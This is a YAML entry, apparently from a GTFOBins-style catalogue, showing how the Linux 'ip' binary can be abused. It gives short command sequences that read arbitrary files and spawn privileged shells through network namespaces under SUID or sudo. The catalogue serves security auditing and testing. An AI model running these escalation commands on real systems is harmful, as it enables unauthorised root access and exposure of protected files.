---
description: |
  The read file content is corrupted by error prints.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        ip -force -batch "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./ip -force -batch "$LFILE"
    - description: This only works for Linux with CONFIG_NET_NS=y.
      code: |
        ./ip netns add foo
        ./ip netns exec foo /bin/sh -p
        ./ip netns delete foo
  sudo:
    - code: |
        LFILE=file_to_read
        sudo ip -force -batch "$LFILE"
    - description: This only works for Linux with CONFIG_NET_NS=y.
      code: |
        sudo ip netns add foo
        sudo ip netns exec foo /bin/sh
        sudo ip netns delete foo
    - description: This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.
      code: |
        sudo ip netns add foo
        sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
        sudo ip netns exec bar /bin/sh
        sudo ip netns delete foo
        sudo ip netns delete bar

---
